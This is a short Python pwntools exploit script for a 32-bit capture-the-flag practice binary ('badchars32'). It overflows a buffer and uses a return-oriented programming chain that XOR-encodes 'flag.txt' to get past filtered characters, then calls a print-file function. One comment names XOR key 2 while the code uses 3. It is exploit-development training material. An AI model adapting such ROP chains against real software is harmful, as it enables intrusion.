from pwn import *
context.bits = 32

#badchars are: 'x', 'g', 'a', '.'
#badchars hex = 61|67|78|2e

overwrite = b"A"*44

# When we xor with the string , int shouldnt produce any bad chars. doing xor (string,2) give "dnce,vzv"
# no bad chars, which is why 2 is good for this exploit
to_be_xored_with = 3
pop_esi_edi_ebp = p32(0x080485b9)
mov_edi_esi = p32(0x0804854f)

pop_ebp = p32(0x080485bb)
pop_ebx = p32(0x0804839d)
xor_ebp_ebx = p32(0x08048547)
nulls = p32(0x0)

freespace = p32(0x0804a018)
freespace2 = p32(0x804a01c)

printfile = p32(0x080483d0)

string1 = p32(int.from_bytes(xor(b"flag" , to_be_xored_with), "little"))
string2 = p32(int.from_bytes(xor(b".txt" , to_be_xored_with), "little"))

payload = overwrite + pop_esi_edi_ebp + string1 + freespace + nulls + mov_edi_esi
payload += pop_esi_edi_ebp + string2 + freespace2 + nulls + mov_edi_esi

for i in range(8):
    payload += pop_ebp
    #using data section address here in raw form
    payload += p32(0x0804a018 + i)
    payload += pop_ebx
    payload += p32(to_be_xored_with)
    payload += xor_ebp_ebx

payload += printfile + nulls + freespace
# print(payload)
p = process("./badchars32")
p.send(payload)
p.interactive()
